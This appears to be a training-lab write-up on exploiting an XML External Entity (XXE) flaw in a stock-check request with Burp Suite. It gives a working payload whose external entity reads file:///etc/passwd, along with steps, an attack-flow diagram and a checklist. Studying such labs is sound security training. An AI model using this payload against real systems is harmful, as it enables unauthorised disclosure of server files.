# Lab 01 – Exploiting XXE to Retrieve Files

## Objective

Exploit an XML External Entity (XXE) vulnerability to retrieve the contents of:

```text
/etc/passwd
```

---

## Vulnerability

The application accepts XML input and processes external entities.

The XML parser therefore allows an attacker-controlled external entity to reference a local file.

---

## Testing Workflow

### Step 1 — Identify the XML Request

Use Burp Suite to intercept the request containing XML data.

Example structure:

```xml
<?xml version="1.0"?>
<stockCheck>
    <productId>1</productId>
    <storeId>London</storeId>
</stockCheck>
```

Send the request to:

```text
Burp Repeater
```

---

## Step 2 — Add an External Entity

Modify the XML to include a `DOCTYPE` declaration.

Example:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>London</storeId>
</stockCheck>
```

---

## Step 3 — Send the Request

Send the modified request.

If the application is vulnerable and returns the entity value, the response may contain the contents of:

```text
/etc/passwd
```

---

## Attack Flow

```text
Attacker
   ↓
Malicious XML
   ↓
DOCTYPE
   ↓
External Entity
   ↓
file:///etc/passwd
   ↓
XML Parser
   ↓
Application Response
```

---

## Expected Result

A successful response contains data from:

```text
/etc/passwd
```

---

## Why It Works

The vulnerable XML parser resolves the external entity:

```text
&xxe;
```

which references:

```text
file:///etc/passwd
```

The application then includes the resolved value in its response.

---

## Key Learning

A basic XXE vulnerability requires:

```text
Attacker-Controlled XML
+
External Entity Resolution
+
Observable Entity Value
```

---

## Burp Checklist

```text
☐ Find XML request
☐ Send to Repeater
☐ Add DOCTYPE
☐ Define external entity
☐ Reference entity
☐ Send request
☐ Inspect response
☐ Confirm file contents
```